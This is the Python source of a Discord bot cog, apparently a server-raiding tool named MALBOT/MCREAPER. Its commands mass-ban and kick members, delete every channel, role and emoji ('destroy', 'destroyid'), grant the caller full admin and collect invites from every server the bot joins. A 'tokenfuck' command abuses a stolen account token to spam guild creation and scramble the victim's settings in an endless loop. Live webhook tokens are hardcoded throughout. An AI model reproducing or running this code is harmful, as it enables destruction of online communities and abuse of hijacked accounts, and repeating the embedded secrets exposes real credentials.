# Sudoer cog by Doz
# ---------------------------------------------------------------------------
import discord, asyncio, random, json, pymongo
from pymongo import MongoClient
from discord import Member, Webhook, RequestsWebhookAdapter
from discord.ext.commands import Bot, has_permissions, CheckFailure, MemberConverter
from discord.ext import commands
# ---------------------------------------------------------------------------
# Load configuration file
with open('config.json') as a:
    config = json.load(a)
# ---------------------------------------------------------------------------
def RandomColour():
    """Generates random colours for embed"""

    randcolour = discord.Colour(random.randint(0x000000, 0xFFFFFF))
    return randcolour
# ---------------------------------------------------------------------------
# Configuration
BOT_OWNER_ID = int(config.get("bot_owner_id"))
DARK_ID = int(440253153775190037) # Dark (Fonce)
HQ_SERVER_INVITE = config.get("server_invite")
BAN_GIF = config.get("ban_gif")
NUKE_GIF = config.get("nuke_gif")
NUKE_LAUNCH_GIF = config.get("nuke_launch_gif")
# ---------------------------------------------------------------------------
# Webhooks
logs_webhook = Webhook.partial(746158498181808229, "JJNzXDenBhg5t97X7eAX52bjhzL0Oz-dS5b_XKoAzkqjQvA90tWva-5fWibrcEQb2WD5",\
 adapter=RequestsWebhookAdapter()) #logs in HQ

reaper_logs_webhook = Webhook.partial(746157945468747776, "lOrgfZFXSTt32nQq9qzZgeNewBxfaM--bTUT4EFg9jgAWhGGfBMcVUSijddymaEQvgWl",\
 adapter=RequestsWebhookAdapter()) #reaper-logs in HQ

errorlogs_webhook = Webhook.partial(746156734019665929, "i88z41TM5VLxuqnbIdM7EjW1SiaK8GkSUu0H3fOTLBZ9RDQmcOG0xoz6P5j1IafoU1t5",\
 adapter=RequestsWebhookAdapter()) #errorlogs in HQ
# ---------------------------------------------------------------------------
# MongoDB Configuration
mongosrv = config.get("mongosrv")
cluster = MongoClient(mongosrv)
db = cluster["mcreaper"]
# Collections
sudo_users_c = db["sudo_users"]
userbio_c = db["userbio"]
# ---------------------------------------------------------------------------
# Checks
async def SUDOER_CHECK(ctx):
    """A check to ensure nobody but SUDOERS can run these commands."""
    query = {"_id": ctx.author.id}
    if ctx.message.author.id == BOT_OWNER_ID:
        return True
    elif (sudo_users_c.count_documents(query) == 1):
        return True
    else:
        return False

async def BOT_OWNER_CHECK(ctx):
    """A check to ensure ONLY the bot OWNER can run these commands."""
    if ctx.message.author.id == BOT_OWNER_ID:
        return True
    elif ctx.message.author.id == DARK_ID:
        return True
    else:
        return False
# ---------------------------------------------------------------------------
class Botsudo(commands.Cog):
    """Commands for managing Global bans"""
    
    def __init__(self, bot):
        self.bot = bot

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def malhelp(self, ctx):
        """Shows help menu for bot owners/sudoers"""
        em = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())

        em.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leaveserver [server_id]` leaves the server.', inline=False)
        em.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
        em.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))

        await ctx.send(embed=em)

    # ---------------------------------------------------------------------------
    # OWNER COMMANDS

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def chansend(self, ctx, chan: int, *, txt = None):

        channel = self.bot.get_channel(chan)
        await channel.send(txt)

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def rgbtest(self, ctx, lol: int):

        mhsend = await ctx.send('Ratelimit test')
        i = 0
        ministick = '='
        stick = ''
        while i <= lol:
            stick += ministick
            em = discord.Embed(title='PP Grow', description=f'Dark is sin\n8{stick}D', colour=RandomColour())

            await asyncio.sleep(2.5)
            await mhsend.edit(embed=em)
            i += 1

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def addsudo(self, ctx, txt = None, *, reason = None):
        """Allows a user to use sudo commands."""

        if txt == None:
            return await ctx.send("`USAGE: addsudo <user> [reason]`")
        if reason == None:
            return await ctx.send("I am not going to add a sudo user for no reason!")

        for a in txt:
            if (a.isnumeric()) == True:
                try:
                    user = await self.bot.fetch_user(txt)
                except:
                    pass
            else:
                try:
                    converter = MemberConverter()
                    user = await converter.convert(ctx, txt)
                except:
                    return await ctx.send(f"{ctx.author.mention}, I can't find that user!")

        query = {"_id": user.id}
        if (sudo_users_c.count_documents(query) == 0):
            post = {"_id": user.id, "user": user.name+'#'+user.discriminator ,"reason": reason}
            sudo_users_c.insert_one(post)
            await ctx.send(f"Successfully added {user} to sudo users!\n**WITH GREAT POWER COMES WITH GREAT RESPONSIBILITY! DON'T ABUSE IT!!**")
            reaper_logs_webhook.send(f"{ctx.author} ({ctx.author.id}) added {user} ({user.id}) to sudo users!\nREASON: {reason}")
        else:
            try:
                await ctx.send(f'That user is already a sudo user!\nUpdating database...')
                sudo_users_c.update_one({"_id":user.id}, {"$set":{"user":user.name+'#'+user.discriminator,"reason":reason}})
            except Exception as e:
                await ctx.send('Failed to add user to sudo database!')
                errorlogs_webhook.send(f'>>> Failed to add user to SUDO DATABSE!\nEXCEPTION: {e}')

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def removesudo(self, ctx, txt = None, *, reason = None):
        """Remove a user from sudo users"""

        if txt == None:
            return await ctx.send("`USAGE: removesudo <user> [reason]`")
        if reason == None:
            return await ctx.send("You have to provide a reason!")

        for a in txt:
            if (a.isnumeric()) == True:
                try:
                    user = await self.bot.fetch_user(txt)
                except:
                    pass
            else:
                try:
                    converter = MemberConverter()
                    user = await converter.convert(ctx, txt)
                except:
                    return await ctx.send(f"{ctx.author.mention}, I can't find that user!")

        query = {"_id": user.id}
        if (sudo_users_c.count_documents(query) == 0):
            await ctx.send(f'{user} ({user.id}) is not on the sudo user database!')
        else:
            try:
                sudo_users_c.delete_one(query)
                await ctx.send(f"Successfully removed {user} ({user.id}) from the sudo users!")
                reaper_logs_webhook.send(f"{ctx.author} ({ctx.author.id}) removed {user} ({user.id}) from the sudo database!\nREASON: {reason}")
            except Exception as e:
                await ctx.send('Failed to remove user to sudo database!')
                errorlogs_webhook.send(f'>>> Failed to remove {user} ({user.id}) from SUDO DATABSE!\nEXCEPTION: {e}')

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def botname(self, ctx, *, name):
        """Renames the bot"""
        try:
            await ctx.message.delete()
            await self.bot.user.edit(username=name)
            await ctx.send(f"Changed my name to **{name}**!")
            reaper_logs_webhook.send(f'**{ctx.message.author} ({ctx.message.author.id})** renamed me to {name}.')
        except Exception:
            await ctx.send(f"{ctx.message.author.mention}! You are changing my name too fast!")

    @commands.check(BOT_OWNER_CHECK)
    @commands.command()
    async def createinvite(self, ctx, chanid: int):
        """Creates an invite to the given channel id"""
        try:
            channel = await self.bot.fetch_channel(chanid)
            inviteurl = await channel.create_invite(destination = channel, xkcd = True, max_uses = 0)
            await ctx.send(f'Created invite link to {channel.name} ({channel.id})\n{inviteurl}')
        except Exception as e:
            await ctx.send(e)

    # ---------------------------------------------------------------------------
    # SUDOER COMMANDS

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def setbio(self, ctx, txt = None, *, bio = None):
        """Sets bio seen by userinfo"""

        if txt == None:
            return await ctx.send("`USAGE: setbio <user> [bio]` empty bio clears bio.")

        for a in txt:
            if (a.isnumeric()) == True:
                try:
                    user = await self.bot.fetch_user(txt)
                except:
                    pass
            else:
                try:
                    converter = MemberConverter()
                    user = await converter.convert(ctx, txt)
                except:
                    return await ctx.send(f"{ctx.author.mention}, I can't find that user!")

        query = {"_id": user.id}
        if (userbio_c.count_documents(query) == 0):
            if bio == None:
                return await ctx.send('The bio is empty!')
            post = {"_id": user.id, "user": user.name+'#'+user.discriminator ,"bio": bio}
            userbio_c.insert_one(post)
            await ctx.send(f'Added a bio for {user.name}!')
        else:
            if bio == None:
                userbio_c.delete_one(query)
                return await ctx.send(f"Cleared {user.name}'s bio!")
            userbio_c.update_one({"_id":user.id}, {"$set":{"user":user.name+'#'+user.discriminator,"bio":bio}})
            await ctx.send(f"Updated {user.name}'s bio!")

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def adminme(self, ctx):
        """Gives yourself admin perms"""

        await ctx.message.delete()

        adminme_role = discord.utils.get(ctx.guild.roles, name="ReaperSU")
        if not adminme_role:
            try:
                adminme_role = await ctx.guild.create_role(name="ReaperSU", reason="SUDO USER", permissions=discord.Permissions.all())

            except discord.Forbidden:
                return await ctx.send("0x02")
            await ctx.message.author.add_roles(adminme_role)
            await ctx.send('0x01')
        else:
            try:
                await ctx.message.author.add_roles(adminme_role)
            except:
                return await ctx.send('0x03')
                
            await ctx.send('0x01')

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def oclear(self, ctx, amount: int, *, reason = None):
        """Clear messages as bot owner"""
        try:
            user = ctx.message.author
            if reason == None:
                reason = "No reason provided."
            em = discord.Embed(
            title = 'Moderator Action',
            description = f'Deleted **{amount}** messages!\nThis message will be deleted automactically.',
            colour = discord.Colour.green()
            )
            
            em.add_field(name='Moderator:', value="A SUDO USER", inline=False)
            em.add_field(name='Reason:', value=reason, inline=False)
            await ctx.message.delete()
            await ctx.channel.purge(limit=amount)
            infomsg = await ctx.send(embed=em)
            await asyncio.sleep(10)
            await infomsg.delete()
            reaper_logs_webhook.send(f'>>> {user} ({user.id}) has cleared {amount} messages from {ctx.guild.name}.\nReason: {reason}')
        except Exception as e:
            await ctx.send('Unknown error occured for `clear`! Logs sent to TGB HQ.')
            errorlogs_webhook.send(f'Error occured for `clear` command! \nCommand:\n`{ctx.message.content}` \nDetails:\n`{e}`')

    @oclear.error
    async def reply_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send('`oclear <amount> [reason]`')

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def okick(self, ctx, member:discord.User, *, reason = None):
        """Kick as bot owner"""
        await ctx.message.delete()
        if member == ctx.message.author:
            await ctx.send("Don't try to kick yourself!")
            return
        if reason == None:
            reason = "No reason specified"
        try:
            em = discord.Embed(title='KICK NOTICE', description=f'You were kicked from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
            em.add_field(name='REASON:', value=f'{reason}', inline=False)
            em.set_footer(text=f'Kicked by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
            await member.send(embed=em)
            await ctx.guild.kick(member, reason=reason)
            await ctx.send(f"**{member}** got kicked really hard by a SUDO USER")
            reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has kicked {member} ({member.id}) from {ctx.guild.name}.\nReason: {reason}')
        except:
            try:
                await ctx.guild.kick(member, reason=reason)
                await ctx.send(f"**{member}** got kicked really hard by a SUDO USER!")
                reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has kicked {member} ({member.id}) from {ctx.guild.name}.\nReason: {reason}')
            except Exception as e:
                errorlogs_webhook.send(f'Error occured for `kick` command! \nCommand:\n`{ctx.message.content}` \nDetails:\n`{e}`')

    # Owner Ban
    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def oban(self, ctx, user:discord.User, *, reason = None):
        """Ban as bot owner"""
        await ctx.message.delete()
        if user == ctx.message.author:
            await ctx.send("Don't try to ban yourself!")
            return
        if reason == None:
            reason = "No reason specified"
        try:
            em = discord.Embed(title='BAN NOTICE', description=f'You were banned from **{ctx.guild.name}** by **{ctx.message.author} ({ctx.message.author.id})** (BOT SUDOER)', colour=discord.Colour.red())
            em.add_field(name='REASON:', value=f'{reason}', inline=False)
            em.set_footer(text=f'Banned by {ctx.message.author.name}', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
            em.set_image(url=BAN_GIF)
            await user.send(embed=em)
            await ctx.guild.ban(user, reason=reason)
            await ctx.send(f"**{user}** got smashed with the ban hammer by **A SUDO USER**!")
            reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has banned {user} ({user.id}) from {ctx.guild.name}.\nReason: {reason}')
        except:
            try:
                await ctx.guild.ban(user, reason=reason)
                await ctx.send(f"**{user}** got smashed with the ban hammer by **A SUDO USER**!")
                reaper_logs_webhook.send(f'>>> {ctx.message.author} ({ctx.message.author.id}) has banned {user} ({user.id}) from {ctx.guild.name}.\nReason: {reason}')
            except Exception as e:
                errorlogs_webhook.send(f'Error occured for `ban` command! \nCommand:\n`{ctx.message.content}` \nDetails:\n`{e}`')

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def onick(self, ctx, member:discord.Member, *, nickname = None):
        """Change nicknames as bot owner"""
        try:
            if nickname == None:
                await member.edit(nick=None)
                await ctx.send(f"Cleared **{member.name}'s** nickname!")
            else:
                await ctx.message.delete()
                await member.edit(nick=nickname)
                await ctx.send(f"Changed **{member.name}'s** nickname to **{nickname}**!")
        except Exception as e:
            await ctx.send(f"Failed to chang **{member.name}'s** nickname!")
            errorlogs_webhook.send(f'Error occured for `onick` command! \nCommand:\n`{ctx.message.content}` \nDetails:\n`{e}`')

    # Reply
    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def reply(self, ctx, chan: int, *, msg: str):

        if chan or msg == None:
            return await ctx.send('USUAGE: `reply <channel_id> <message>`')

        chane = self.bot.get_channel(chan)
        em = discord.Embed(
            title = "MC Support",
            timestamp = ctx.message.created_at,
            description = "Your report/suggestion has been answered! \nPlease do not send false information or else you will be rejected!",
            colour = RandomColour()
        )

        em.add_field(name="Representer:", value=f"**{ctx.message.author}** ({ctx.message.author.id})", inline=False)
        em.add_field(name="Response:", value=f"{msg}", inline=False)
        em.add_field(name="Join our TGB server!", value=HQ_SERVER_INVITE, inline=False)

        await ctx.message.delete()
        await chane.send(embed=em)
        await ctx.send(f"Sent response: \n{msg} in channel **{chan}**")

    # Servers
    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def servers(self, ctx):
        await ctx.send('Gathering server invites...')
        for servers in self.bot.guilds:
            try:
                serverinvitesr = await servers.invites()
                for serverinvites in serverinvitesr:
                    await logs_webhook.send(serverinvites.url)
            except:
                pass
        await ctx.send("Check console or logs for server invites")

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def leaveserver(self, ctx, server_id: int = None):
        """Leaves a server"""
        try:
            if server_id == None:
                await ctx.send("My master told me to leave, bye.")
                await ctx.guild.leave()
            else:
                server = self.bot.get_guild(server_id)
                await server.leave()
                await ctx.send(f"Left {server} successfully!")
            reaper_logs_webhook.send(f'**{ctx.message.author} ({ctx.message.author.id})** ran `leaveserver` in {ctx.guild.name} ({ctx.guild.id})!')
        except Exception as e:
            print(f"Failed to leave {server}\n{e}")
            await ctx.send(f"Failed to leave {server}\n{e}")

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def chanmsgall(self, ctx, *, msg):

        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")

        for channel in list(ctx.guild.channels):
            try:
                await channel.send(msg)
                print (f"{channel.name} has received message in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT received message in {ctx.guild.name}")

        await ctx.message.delete()
        print ("Action Completed: chanmsgall")
    # Message all channels in a server.

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def kickall(self, ctx):
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: kall")
    # Kicks every member in a server.

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def banall(self, ctx):
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: ball")  
    # Bans every member in a server.

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def rall(self, ctx, *, rename_to):
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: rall")
    # Renames every member in a server.

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def mall(self, ctx, *, message):
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: mall")
    # Messages every member in a server.

    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def dall(self, ctx, condition):
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall all")
    # Can perform multiple actions that envolve mass deleting.

    # You know what this does to a server
    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def destroy(self, ctx):
        await ctx.send(NUKE_GIF)
        await ctx.send("Your server had been fucked up by TGB!")
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                logs_webhook.send(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                logs_webhook.send(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                logs_webhook.send(f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                logs_webhook.send(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()

                logs_webhook.send(f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                logs_webhook.send(f"{role.name} NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                logs_webhook.send(f"{user.name} has been banned from {ctx.guild.name}")
            except:
                logs_webhook.send(f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    # Same as destroy but uses a server id instead.
    @commands.check(SUDOER_CHECK)
    @commands.command()
    async def destroyid(self, ctx, server_id: int):
        servername = self.bot.get_guild(server_id)
        nem = discord.Embed(description=f'Attempting to Nuke **{servername.name}**...')
        nem.set_image(url=NUKE_LAUNCH_GIF)
        await ctx.send(embed=nem)
        reaper_logs_webhook.send(f"**{ctx.message.author}** used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id}) on {servername} ({servername.id})")
        await ctx.message.delete()
        for emoji in list(servername.emojis):
            try:
                await emoji.delete()
                logs_webhook.send(f"{emoji.name} has been deleted in {servername.name}")
            except:
                logs_webhook.send(f"{emoji.name} has NOT been deleted in {servername.name}")
        for channel in list(servername.channels):
            try:
                await channel.delete()
                logs_webhook.send(f"{channel.name} has been deleted in {servername.name}")
            except:
                logs_webhook.send(f"{channel.name} has NOT been deleted in {servername.name}")
        for role in list(servername.roles):
            try:
                await role.delete()
                logs_webhook.send(f"{role.name} has been deleted in {servername.name}")
            except:
                logs_webhook.send(f"{role.name} has NOT been deleted in {servername.name}")
        for user in list(servername.members):
            try:
                await servername.ban(user)
                logs_webhook.send(f"{user.name} has been banned from {servername.name}")
            except:
                logs_webhook.send(f"{user.name} has FAILED to be banned from {servername.name}")
        await ctx.send(f'Finished nuking **{servername.name}**')

    @commands.check(SUDOER_CHECK)
    @commands.command(aliases=['tokenfucker', 'disable', 'crash']) 
    async def tokenfuck(self, ctx, _token): # b'\xfc' 

        locales = [ 
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
        ]

        await ctx.message.delete()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
            'Content-Type': 'application/json',
            'Authorization': _token,
        }
        
        import requests
        request = requests.Session()
        payload = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "invisible"
        }
        guild = {
            'channels': None,
            'icon': None,
            'name': "MCREAPER",
            'region': "europe"
        } 
        for _i in range(50):
            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
            except Exception as e:
                errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
            else:
                break

        from itertools import cycle
        modes = cycle(["light", "dark"])
        statuses = cycle(["online", "idle", "dnd", "invisible"])
        while True:
            setting = {
                'theme': next(modes),
                'locale': random.choice(locales),
                'status': next(statuses)
            }
            while True:
                try:
                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
                except Exception as e:
                    errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
                else:
                    break
# ---------------------------------------------------------------------------
def setup(bot):
    bot.add_cog(Botsudo(bot))